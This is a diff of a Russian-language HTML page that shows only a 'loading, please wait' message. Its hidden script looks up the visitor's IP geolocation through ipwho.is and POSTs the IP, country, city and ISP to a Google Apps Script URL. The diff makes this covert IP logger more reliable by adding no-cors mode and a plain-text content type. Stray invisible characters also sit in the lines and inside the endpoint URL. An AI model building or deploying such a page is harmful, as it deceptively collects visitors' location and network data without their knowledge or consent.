@@ -1,20 +1,22 @@
-‎<!DOCTYPE html>
-‎<html>
-‎<head>
-‎    <meta charset="utf-8">
-‎    <title>Загрузка...</title>
-‎</head>
-‎<body>
-‎    <h2>Пожалуйста, подождите, страница загружается...</h2>
-‎    <script>
-‎    fetch('https://ipwho.is/')
-‎      .then(r => r.json())
-‎      .then(d => {
-‎        fetch('https://script.google.com/macros/s/AKfycbwgsGh5kn17a3zPJJqKyN_hzf2JtzSCDy9CNmmYggpV27jxeD8ZbhulW2IPGU8wncT1Yg/exec', {
-‎          method: 'POST',
-‎          body: JSON.stringify({ip: d.ip, country: d.country, city: d.city, isp: d.connection.isp})
-‎        });
-‎      });
-‎    </script>
-‎</body>
-‎</html>
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>Загрузка...</title>
+</head>
+<body>
+    <h2>Пожалуйста, подождите, страница загружается...</h2>
+    <script>
+    fetch('https://ipwho.is/')
+      .then(r => r.json())
+      .then(d => {
+        fetch('‎https://script.google.com/macros/s/AKfycbwgsGh5kn17a3zPJJqKyN_hzf2JtzSCDy9CNmmYggpV27jxeD8ZbhulW2IPGU8wncT1Yg/exec', {
+          method: 'POST',
+          mode: 'no-cors', 
+          headers: { 'Content-Type': 'text/plain' },
+          body: JSON.stringify({ip: d.ip, country: d.country, city: d.city, isp: d.connection.isp})
+        });
+      });
+    </script>
+</body>
+</html>
